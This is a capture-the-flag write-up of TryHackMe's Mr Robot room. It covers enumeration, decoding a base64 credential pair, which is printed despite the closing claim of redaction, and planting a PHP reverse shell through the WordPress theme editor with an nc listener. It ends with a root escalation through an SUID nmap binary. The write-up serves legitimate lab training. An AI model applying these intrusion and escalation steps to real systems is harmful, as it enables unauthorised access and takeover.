# TryHackMe - Mr Robot (CTF Write-up)

> Author: Adam Pawelczyk
>
> Date: 2025-07-07
>
> Category: Web
>
> Difficulty: Medium
>
> [TryHackMe Link](https://tryhackme.com/room/mrrobot)

---

## Challenge Description

This Mr. Robot-themed challenge tasks us with compromising a virtual machine modeled after the *fsociety* universe. The objective is to find three hidden keys located on the system.

We're provided with the virtual machine to deploy and investigate, hosted at: `10.10.202.58`


## Goal

Locate all three hidden keys.


## TL;DR

- Discovered ports 22, 80, 443 using `nmap`.
- Found first flag in `robots.txt`
- Found credentials in `license.txt`.
- Logged into WordPress admin panel.
- Gained a reverse shell via theme edit.
- Found second flag inside the `robot` home directory.
- Switched to robot user after cracking MD5 password and retrieved the second flag.
- Escalated privileges using `nmap` SUID binary.
- Retrieved the third flag.


## Reconnaissance

### Port Scan

We start with a full TCP port scan using `nmap`:

```bash
sudo nmap 10.10.202.58 -sV -p- -oA initial_scan
```

Key Results:

```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

## Web Enumeration

### Initial Site Analysis

Navigating to http://10.10.202.58 reveals a minimal interface - just a prompt allowing predefined commands. After experimenting, nothing useful was discovered from this interface.

![Main Page](images/main_page.png)

So we pivot to enumerating potential hidden directories and files.

### Directory and File Brute-Force

We use `gobuster` to uncover files and directories:

```bash
gobuster dir -u http://10.10.202.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
```

This reveals several interesting finds:

- `/login`: Leads to a WordPress login portal.
- `/license.txt`: Contains a hidden base64 encoded string.
- `/robots.txt`: Lists two files:
    - `fsocity.dic` - dictionary file containing presumably usernames and passwords.
    - `key-1-of-3.txt` - file containing the first flag.

We can read the flag file by navigating to http://10.10.202.58/key-1-of-3.txt

### Credential Discovery

Inspecting `license.txt`, we find the following base64-encoded string: `ZWxsaW90OkVSMjgtMDY1Mgo=`. Decoding it via [CyberChef](https://gchq.github.io/CyberChef) reveals a credential pair containing username and password.

![Hidden Credentials](images/hidden_credentials.png)


## Exploitation

### Gaining Access to WordPress

We can login to the WordPress using the previously discovered credentials. Though no flags are directly visible in the dashboard, we can edit theme files - which provide an excellent attack vector.

### Reverse Shell Setup

We select the active theme (e.g., twentyfifteen) and edit the `404.php`. We replace the contents with a PHP reverse shell payload which we can generate from [revshells](https://www.revshells.com/).

![Theme Editor](images/theme_editor.png)

We modified `404.php`, but any PHP file in the selected theme would have worked as long as it's editable via the WordPress dashboard and directly accessible in the browser.

Then, we start a listener on our system:

```bash
nc -lvnp 4343
```

To execute the reverse shell we have to navigate to:

`http://10.10.202.58/wp-content/themes/twentyfifteen/404.php`


## Post-Exploitation

### Enumerate Users

With a reverse shell, we look for users that are present on the system:

```bash
ls -l /home
```

We discover a `robot` user.

### Enumerate Robot's Home Directory

```bash
ls -la /home/robot
```

Results:

```bash
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt                                                                                                                                      
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5 
```

We can't read `key-2-of-3.txt`, but `password.raw-md5` is world-readable.

```bash
cat /home/robot/password.raw-md5
```

We get an MD5 hash of `robot's` password which we can crack using [CrackStation](https://crackstation.net/)

![Crack Station](images/crack_station.png)

Now we can switch to robot and read the second flag:

```bash
su robot
cat /home/robot/key-2-of-3.txt
```


## Privilege Escalation

### Check Sudo Rights

First we can check if the `robot` user has any elevated permissions using `sudo`:

```bash
sudo -l
```

Output confirms that `robot` has no `sudo` rights. Therefore, we need an alternative method to escalate privileges.

### Enumerating SUID Binaries

SUID (Set User ID) is a special file permission where the executable runs with the privileges of the file owner - often `root`. If we can find a SUID binary that supports command execution, it may be possible to exploit it to gain `root` access.

We search for such binaries:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Among the results we find:

```bash
-rwsr-xr-x 1 root root   17272 Jun 2  18:23 /usr/local/bin/nmap
```

`nmap` has the SUID permission set and it's owned by `root`.

### Exploit Nmap SUID for Shell

We go to the [GTFOBins](https://gtfobins.github.io/) to see how we can exploit `nmap`.

As we can see on the page we can launch `nmap` in the interactive mode:

```bash
namp --interactive
```
Then we can obtain the `root` shell:

```bash
nmap> !sh
```

## Post-Exploitation

We now check the `/root` directory

```bash
ls -la /root
```

and we find:

```bash
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
```

We can read it and obtain the third and final flag:

```bash
cat /root/key-3-of-3.txt
```


## Conclusion

This was a cleverly crafted Mr. Robot-themed CTF, with a strong emphasis on realistic enumeration and privilege escalation. Here's what I did:

- Enumeration & Reconnaissance: Discovered useful paths (`robots.txt`, `license.txt`) and base64-encoded credentials.

- Web Application Exploitation: Logged into WordPress as admin, edited a theme to execute a PHP reverse shell.

- Lateral Movement: Switched users after cracking MD5 password.

- Privilege Escalation: Used an SUID-enabled nmap binary to escalate to `root`.

- Capture Flags: Successfully retrieved all 3 hidden keys.

### Skills Practiced

- Directory and file enumeration using `gobuster`.

- Base64 decoding and credential extraction.

- Reverse shell creation and listener setup.

- Privilege escalation via SUID misconfiguration.

### Mitigations

- Never leave sensitive credentials or base64 data in public files.

- Avoid SUID on binaries like `nmap` that can be abused for shell access.

### Final Thoughts

This room was an excellent blend of web exploitation and privilege escalation. It’s beginner-friendly yet teaches critical real-world techniques - perfect for CTF practice and foundational pentesting skills.

**Note:** Passwords, keys, and sensitive strings are redacted to comply with TryHackMe's write-up policy.